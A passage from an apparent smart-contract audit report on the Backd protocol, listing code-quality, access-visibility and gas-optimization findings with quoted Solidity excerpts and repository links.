https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/BkdToken.sol#L21  ### 7. `_prepareDeadline()`, `_setConfig()`, and `_executeDeadline()` should be `private` I flagged this in the last Backd contest, but it doesn't seem to have been addressed, so bringing it up again: These functions have the ability to bypass the timelocks of every setting. No contract besides the `Preparable` contract itself should need to call these functions, and having them available will lead to exploits. The contracts that currently call `_setConfig()` in their constructors should be given a new function `_initConfig()` for this purpose. The `Vault` [calls](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L222) some of these functions as well, and should be changed to manually inspect the deadline rather than mucking with the internals, which is error-prone. The mappings should also be made `private`, and there should be public getters to read their values  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/utils/Preparable.sol   #1  115      /** 116       * @notice Execute uint256 config update (with time delay enforced). 117       * @dev Needs to be called after the update was prepared. Fails if called before time delay is met. 118       * @return New value. 119       */ 120      function _executeUInt256(bytes32 key) internal returns (uint256) { 121          _executeDeadline(key); 122          uint256 newValue = pendingUInts256[key]; 123          _setConfig(key, newValue); 124          return newValue; 125      } 126   127      /** 128       * @notice Execute address config update (with time delay enforced). 129       * @dev Needs to be called after the update was prepared. Fails if called before time delay is met. 130       * @return New value. 131       */ 132      function _executeAddress(bytes32 key) internal returns (address) { 133          _executeDeadline(key); 134          address newValue = pendingAddresses[key]; 135          _setConfig(key, newValue); 136          return newValue; 137:     } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L115-L137  ## Non-critical Issues  ### 1. Unneded import  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/BkdToken.sol   #1  8:   import "../../libraries/ScaledMath.sol"; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/BkdToken.sol#L8  ### 2. Return values of `approve()` not checked Not all `IERC20` implementations `revert()` when there's a failure in `approve()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually approving anything  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #1  25:           IERC20(rewardToken_).approve(msg.sender, type(uint256).max); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L25  ### 3. Large multiples of ten should use scientific notation (e.g. `1e6`) rather than decimal literals (e.g. `1000000`), for readability  *There are 2 instances of this issue:* ```solidity File: protocol/contracts/utils/CvxMintAmount.sol   #1  10:       uint256 private constant _CLIFF_SIZE = 100000 * 1e18; //new cliff every 100,000 tokens ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L10  ```solidity File: protocol/contracts/utils/CvxMintAmount.sol   #2  12:       uint256 private constant _MAX_SUPPLY = 100000000 * 1e18; //100 mil max supply ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L12  ### 4. Missing event for critical parameter change  *There are 3 instances of this issue:* ```solidity File: protocol/contracts/tokenomics/InflationManager.sol   #1  58        function setMinter(address _minter) external override onlyGovernance returns (bool) { 59            require(minter == address(0), Error.ADDRESS_ALREADY_SET); 60            require(_minter != address(0), Error.INVALID_MINTER); 61            minter = _minter; 62            return true; 63:       } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L58-L63  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #2  68        function setAdmin(address _admin) external override { 69            require(_admin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 70            require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); 71            admin = _admin; 72:       } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L68-L72  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #3  74        function setFundAdmin(address _fundadmin) external override { 75            require(_fundadmin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 76            require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); 77            fundAdmin = _fundadmin; 78:       } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L74-L78  ### 5. Use a more recent version of solidity Use a solidity version of at least 0.8.12 to get `string.concat()` to be used instead of `abi.encodePacked(<str>,<str>)`  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/InflationManager.sol   #1  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L2  ### 6. Use a more recent version of solidity Use a solidity version of at least 0.8.13 to get the ability to use `using for` with a list of free functions  *There are 16 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L2  ```solidity File: protocol/contracts/Controller.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L2  ```solidity File: protocol/contracts/utils/CvxMintAmount.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L2  ```solidity File: protocol/contracts/BkdLocker.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L2  ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L2  ```solidity File: protocol/contracts/AddressProvider.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L2  ```solidity File: protocol/contracts/RewardHandler.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L2  ```solidity File: protocol/contracts/tokenomics/Minter.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L2  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L2  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L2  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L2  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L2  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L2  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L2  ```solidity File: protocol/contracts/tokenomics/BkdToken.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/BkdToken.sol#L2  ```solidity File: protocol/contracts/access/RoleManager.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L2  ### 7. Constant redefined elsewhere Consider defining in only one contract so that values cannot become out of sync when only one location is updated. A [cheap way](https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678) to store constants in a single location is to create an `internal constant` in a `library`. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.  *There are 10 instances of this issue:* ```solidity File: protocol/contracts/Controller.sol  /// @audit seen in protocol/contracts/StakerVault.sol  21:       IAddressProvider public immutable override addressProvider; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L21  ```solidity File: protocol/contracts/RewardHandler.sol  /// @audit seen in protocol/contracts/StakerVault.sol  20:       IController public immutable controller;  /// @audit seen in protocol/contracts/Controller.sol  21:       IAddressProvider public immutable addressProvider; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L20  ```solidity File: protocol/contracts/tokenomics/Minter.sol  /// @audit seen in protocol/contracts/RewardHandler.sol  55:       IController public immutable controller; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L55  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  /// @audit seen in protocol/contracts/RewardHandler.sol  24:       IAddressProvider public immutable addressProvider; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L24  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  /// @audit seen in protocol/contracts/tokenomics/Minter.sol  20:       IController public immutable controller; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L20  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  /// @audit seen in protocol/contracts/tokenomics/AmmGauge.sol  30:       IController public immutable controller; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L30  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  /// @audit seen in protocol/contracts/tokenomics/KeeperGauge.sol  19:       IController public immutable controller;  /// @audit seen in protocol/contracts/StakerVault.sol  21:       IInflationManager public immutable inflationManager; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L19  ```solidity File: protocol/contracts/access/RoleManager.sol  /// @audit seen in protocol/contracts/tokenomics/InflationManager.sol  25:       IAddressProvider public immutable addressProvider; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L25  ### 8. Inconsistent spacing in comments Some lines use `// x` and some use `//x`. The instances below point out the usages that don't follow the majority, within each file  *There are 3 instances of this issue:* ```solidity File: protocol/contracts/utils/CvxMintAmount.sol   #1  11:       uint256 private constant _CLIFF_COUNT = 1000; // 1,000 cliffs ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L11  ```solidity File: protocol/contracts/utils/CvxMintAmount.sol   #2  14:           IERC20(address(0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B)); // CVX Token ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L14  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol   #3  532:      //TOOD: See if this is still needed somewhere ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L532  ### 9. File is missing NatSpec  *There are 5 instances of this issue:* ```solidity File: protocol/contracts/utils/CvxMintAmount.sol  ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol  ```solidity File: protocol/contracts/access/Authorization.sol  ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/Authorization.sol  ```solidity File: protocol/contracts/access/RoleManager.sol  ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol  ### 10. NatSpec is incomplete  *There are 17 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  /// @audit Missing: '@param strategy' 93        /** 94         * @notice Registers an address as a strategy to be excluded from token accumulation. 95         * @dev This should be used if a strategy deposits into a stakerVault and should not get gov. tokens. 96         * @return `true` if success. 97         */ 98:       function addStrategy(address strategy) external override returns (bool) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L93-L98  ```solidity File: protocol/contracts/Controller.sol  /// @audit Missing: '@param payer' 117       /** 118        * @return the total amount of ETH require by `payer` to cover the fees for 119        * positions registered in all actions 120        */ 121:      function getTotalEthRequiredForGas(address payer) external view override returns (uint256) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L117-L121  ```solidity File: protocol/contracts/utils/Preparable.sol  /// @audit Missing: '@param key' 33        /** 34         * @notice Prepares an uint256 that should be committed to the contract 35         * after `_MIN_DELAY` elapsed 36         * @param value The value to prepare 37         * @return `true` if success. 38         */ 39        function _prepare( 40            bytes32 key, 41            uint256 value, 42            uint256 delay 43:       ) internal returns (bool) {  /// @audit Missing: '@param delay' 33        /** 34         * @notice Prepares an uint256 that should be committed to the contract 35         * after `_MIN_DELAY` elapsed 36         * @param value The value to prepare 37         * @return `true` if success. 38         */ 39        function _prepare( 40            bytes32 key, 41            uint256 value, 42            uint256 delay 43:       ) internal returns (bool) {  /// @audit Missing: '@param key' 57        /** 58         * @notice Prepares an address that should be committed to the contract 59         * after `_MIN_DELAY` elapsed 60         * @param value The value to prepare 61         * @return `true` if success. 62         */ 63        function _prepare( 64            bytes32 key, 65            address value, 66            uint256 delay 67:       ) internal returns (bool) {  /// @audit Missing: '@param delay' 57        /** 58         * @notice Prepares an address that should be committed to the contract 59         * after `_MIN_DELAY` elapsed 60         * @param value The value to prepare 61         * @return `true` if success. 62         */ 63        function _prepare( 64            bytes32 key, 65            address value, 66            uint256 delay 67:       ) internal returns (bool) {  /// @audit Missing: '@param key' 81        /** 82         * @notice Reset a uint256 key 83         * @return `true` if success. 84         */ 85:       function _resetUInt256Config(bytes32 key) internal returns (bool) {  /// @audit Missing: '@param key' 93        /** 94         * @notice Reset an address key 95         * @return `true` if success. 96         */ 97:       function _resetAddressConfig(bytes32 key) internal returns (bool) {  /// @audit Missing: '@param key' 115       /** 116        * @notice Execute uint256 config update (with time delay enforced). 117        * @dev Needs to be called after the update was prepared. Fails if called before time delay is met. 118        * @return New value. 119        */ 120:      function _executeUInt256(bytes32 key) internal returns (uint256) {  /// @audit Missing: '@param key' 127       /** 128        * @notice Execute address config update (with time delay enforced). 129        * @dev Needs to be called after the update was prepared. Fails if called before time delay is met. 130        * @return New value. 131        */ 132:      function _executeAddress(bytes32 key) internal returns (address) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L33-L43  ```solidity File: protocol/contracts/AddressProvider.sol  /// @audit Missing: '@return' 79         * @param action Address of action to add. 80         */ 81:       function addAction(address action) external override onlyGovernance returns (bool) {  /// @audit Missing: '@param freezable' 207       /** 208        * @notice Initializes an address 209        * @param key Key to initialize 210        * @param initialAddress Address for `key` 211        */ 212       function initializeAddress( 213           bytes32 key, 214           address initialAddress, 215           bool freezable 216:      ) public override onlyGovernance {  /// @audit Missing: '@param key' 264       /** 265        * @notice Execute update of `key` 266        * @return New address. 267        */ 268:      function executeAddress(bytes32 key) external override returns (address) {  /// @audit Missing: '@param key' 274       /** 275        * @notice Reset `key` 276        * @return true if it was reset 277        */ 278:      function resetAddress(bytes32 key) external override onlyGovernance returns (bool) {  /// @audit Missing: '@param token' 396       /** 397        * @notice Tries to get the staker vault for a given token but does not throw if it does not exist 398        * @return A boolean set to true if the vault exists and the vault address. 399        */ 400:      function tryGetStakerVault(address token) external view override returns (bool, address) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L79-L81  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  /// @audit Missing: '@param lpToken' 236       /** 237        * @notice Execute update of lp pool weight (with time delay enforced). 238        * @dev Needs to be called after the update was prepared. Fails if called before time delay is met. 239        * @return New lp pool weight. 240        */ 241:      function executeLpPoolWeight(address lpToken) external override returns (uint256) {  /// @audit Missing: '@param token' 321       /** 322        * @notice Execute update of lp pool weight (with time delay enforced). 323        * @dev Needs to be called after the update was prepared. Fails if called before time delay is met. 324        * @return New lp pool weight. 325        */ 326:      function executeAmmTokenWeight(address token) external override returns (uint256) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L236-L241  ### 11. Event is missing `indexed` fields Each `event` should use three `indexed` fields if there are three or more fields  *There are 10 instances of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol  18:       event Migrated(address user, address oldPool, address newPool, uint256 lpTokenAmount); // Emitted when a migration is completed ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L18  ```solidity File: protocol/contracts/tokenomics/Minter.sol  58:       event TokensMinted(address beneficiary, uint256 amount); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L58  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  43:       event NewKeeperWeight(address indexed pool, uint256 newWeight);  44:       event NewLpWeight(address indexed pool, uint256 newWeight);  45:       event NewAmmTokenWeight(address indexed token, uint256 newWeight); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L43  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  34:       event Revoked(address indexed user, uint256 revokedAmount); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L34  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  34:       event RewardClaimed(address indexed account, uint256 amount); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L34  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  48:       event Fund(address indexed recipient, uint256 reward);  49:       event Claim(address indexed user, uint256 amount); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L48  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol  29:       event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L29  ### 12. Not using the named return variables anywhere in the function is confusing Consider changing the variable to be an unnamed one  *There are 2 instances of this issue:* ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol   #1  /// @audit received 43        function burnToTarget(address[] memory tokens_, address targetLpToken_) 44            public 45            payable 46            override 47:           returns (uint256 received) ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L43-L47  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol   #2  /// @audit received 96        function _depositInPool(address underlying_, ILiquidityPool pool_) 97            internal 98:           returns (uint256 received) ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L96-L98  ### 13. Typos  *There are 6 instances of this issue:* ```solidity File: protocol/contracts/BkdLocker.sol  /// @audit invlude 173:       * @dev This does not invlude the gov. tokens queued for withdrawal. ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L173  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  /// @audit TOOD 532:      //TOOD: See if this is still needed somewhere ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L532  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol  /// @audit Emmited 29:       event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token  /// @audit successfull 29:       event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token  /// @audit Recieve 35:       receive() external payable {} // Recieve function for withdrawing from Backd ETH Pool  /// @audit Transfering 84:           // Transfering LP tokens back to sender ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L29 
## Summary  ### Gas Optimizations | |Issue|Instances| |-|:-|:-:| | 1 | Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate | 5 | | 2 | State variables only set in the constructor should be declared `immutable` | 1 | | 3 | State variables can be packed into fewer storage slots | 2 | | 4 | State variables should be cached in stack variables rather than re-reading them from storage | 32 | | 5 | Multiple accesses of a mapping/array should use a local variable cache | 7 | | 6 | The result of external function calls should be cached rather than re-calling the function | 2 | | 7 | `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables | 14 | | 8 | `internal` functions only called once can be inlined to save gas | 6 | | 9 | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` | 1 | | 10 | `<array>.length` should not be looked up in every loop of a `for`-loop | 8 | | 11 | `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 1 | | 12 | `require()`/`revert()` strings longer than 32 bytes cost extra gas | 1 | | 13 | Using `bool`s for storage incurs overhead | 7 | | 14 | Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement | 7 | | 15 | Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead | 3 | | 16 | Using `private` rather than `public` for constants, saves gas | 11 | | 17 | Duplicated `require()`/`revert()` checks should be refactored to a modifier or function | 7 | | 18 | `require()` or `revert()` statements that check input arguments should be at the top of the function | 3 | | 19 | Empty blocks should be removed or emit something | 3 | | 20 | Use custom errors rather than `revert()`/`require()` strings to save deployment gas | 109 | | 21 | Functions guaranteed to revert when called by normal users can be marked `payable` | 53 |  Total: 283 instances over 21 issues   ## Gas Optimizations  ### 1. Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - **30 gas**) and that calculation's associated stack operations.  *There are 5 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  50        mapping(address => uint256) public balances; 51        mapping(address => uint256) public actionLockedBalances; 52     53:       mapping(address => mapping(address => uint256)) internal _allowances; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L50-L53  ```solidity File: protocol/contracts/BkdLocker.sol  27        mapping(address => uint256) public balances; 28        mapping(address => uint256) public boostFactors; 29        mapping(address => uint256) public lastUpdated; 30        mapping(address => WithdrawStash[]) public stashedGovTokens; 31:       mapping(address => uint256) public totalStashed; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L27-L31  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  27        mapping(address => uint256) public perUserStakedIntegral; 28:       mapping(address => uint256) public perUserShare; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L27-L28  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  44        mapping(address => uint256) public initialLocked; 45        mapping(address => uint256) public totalClaimed; 46:       mapping(address => address) public holdingContract; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L44-L46  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  25        mapping(address => uint256) public perUserStakedIntegral; 26:       mapping(address => uint256) public perUserShare; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L25-L26  ### 2. State variables only set in the constructor should be declared `immutable` Avoids a Gsset (**20000 gas**) in the constructor, and replaces each Gwarmacces (**100 gas**) with a `PUSH32` (**3 gas**).  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #1  39:       uint256 public totalTime; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L39  ### 3. State variables can be packed into fewer storage slots If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper  *There are 2 instances of this issue:* ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #1  /// @audit Variable ordering with 8 slots instead of the current 9: /// @audit  uint256(32):totalTime, uint256(32):initialLockedSupply, uint256(32):unallocatedSupply, mapping(32):initialLocked, mapping(32):totalClaimed, mapping(32):holdingContract, address(20):admin, bool(1):initializedSupply, address(20):fundAdmin 34:       address public admin; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L34  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol   #2  /// @audit Variable ordering with 5 slots instead of the current 6: /// @audit  mapping(32):keeperRecords, mapping(32):perPeriodTotalFees, uint256(32):epoch, mapping(32):perPeriodTotalInflation, uint48(6):lastUpdated, bool(1):killed 27:       mapping(address => KeeperRecord) public keeperRecords; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L27  ### 4. State variables should be cached in stack variables rather than re-reading them from storage The instances below point to the second+ access of a state variable within a function. Caching of a state variable replace each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.  *There are 32 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  /// @audit token 330:          uint256 oldBal = IERC20(token).balanceOf(address(this));  /// @audit token 333:              ILiquidityPool pool = addressProvider.getPoolForToken(token);  /// @audit token 337:          IERC20(token).safeTransferFrom(msg.sender, address(this), amount);  /// @audit token 338:          uint256 staked = IERC20(token).balanceOf(address(this)) - oldBal;  /// @audit token 375:          uint256 oldBal = IERC20(token).balanceOf(address(this));  /// @audit token 381:          IERC20(token).safeTransfer(dst, amount);  /// @audit token 383:          uint256 unstaked = oldBal.uncheckedSub(IERC20(token).balanceOf(address(this))); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L330  ```solidity File: protocol/contracts/BkdLocker.sol  /// @audit totalLockedBoosted 97:           curRewardTokenData.feeIntegral += amount.scaledDiv(totalLockedBoosted); ``` 